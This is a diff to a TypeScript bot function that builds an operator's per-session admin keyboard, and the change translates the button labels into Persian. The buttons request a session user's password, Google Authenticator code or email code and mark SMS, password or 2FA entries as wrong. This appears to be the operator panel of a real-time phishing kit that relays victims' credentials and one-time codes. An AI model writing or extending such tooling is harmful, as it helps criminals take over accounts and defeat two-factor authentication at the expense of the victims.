@@ -852,7 +852,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Password button - show if not attempted
   if (!session.authAttempts["password"]) {
     authRow.push({
-      text: "🔒 Password",
+      text: "🔐 درخواست رمز عبور",
       callback_data: `auth_password_${sessionId}`,
     });
     console.log("✅ Added Password button");
@@ -861,7 +861,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Google Auth button - show if not attempted
   if (!session.authAttempts["google"]) {
     authRow.push({
-      text: "📱 Google Auth",
+      text: "📱 احراز هویت دومرحله‌ای",
       callback_data: `auth_google_${sessionId}`,
     });
     console.log("✅ Added Google Auth button");
@@ -879,7 +879,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   if (!session.authAttempts["email"]) {
     buttons.push([
       {
-        text: "📧 Email Code",
+        text: "📧 درخواست کد ایمیل",
         callback_data: `auth_email_${sessionId}`,
       },
     ]);
@@ -889,7 +889,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Wrong SMS button - always available (moved from wrong buttons section)
   buttons.push([
     {
-      text: "❌ Wrong SMS",
+      text: "❌ شماره اشتباه است",
       callback_data: `incorrect_sms_${sessionId}`,
     },
   ]);
@@ -905,7 +905,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     session.authAttempts["password"] > 0
   ) {
     wrongButtonsRow1.push({
-      text: "❌ Wrong Password",
+      text: "🚫 رمز عبور اشتباه",
       callback_data: `incorrect_password_${sessionId}`,
     });
     console.log("✅ Added Wrong Password button");
@@ -914,7 +914,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Wrong Google Auth button - only if user attempted google auth at least once
   if (session.authAttempts["google"] && session.authAttempts["google"] > 0) {
     wrongButtonsRow1.push({
-      text: "❌ Wrong Google Auth",
+      text: "🚫 کد احراز اشتباه",
       callback_data: `incorrect_google_${sessionId}`,
     });
     console.log("✅ Added Wrong Google Auth button");
